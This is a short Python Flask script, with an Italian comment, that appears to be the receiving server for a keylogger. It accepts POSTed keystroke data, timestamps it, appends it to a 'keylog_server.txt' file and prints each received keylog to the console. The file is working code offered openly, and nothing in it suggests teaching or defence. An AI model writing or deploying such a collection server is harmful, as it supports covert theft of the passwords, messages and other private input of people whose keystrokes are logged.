from flask import Flask, request
import time

ENABLE_VERBOSE = True

app = Flask(__name__)

@app.route('/', methods=['POST'])
def receive_keylog():
    # scrivo su file l'ora e la data
    datetime = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    with open("keylog_server.txt", "a") as f:
        f.write("\n\n" + datetime + "\n")
    data = request.data.decode('utf-8')
    data = data + "\n"
    with open("keylog_server.txt", "a") as f:
        f.write(data)
    if ENABLE_VERBOSE:
        print("[+] Keylog received")
        print("[+] Data received: " + data)
    return "Keylog received"

if __name__ == '__main__':
    app.run(port=5000)
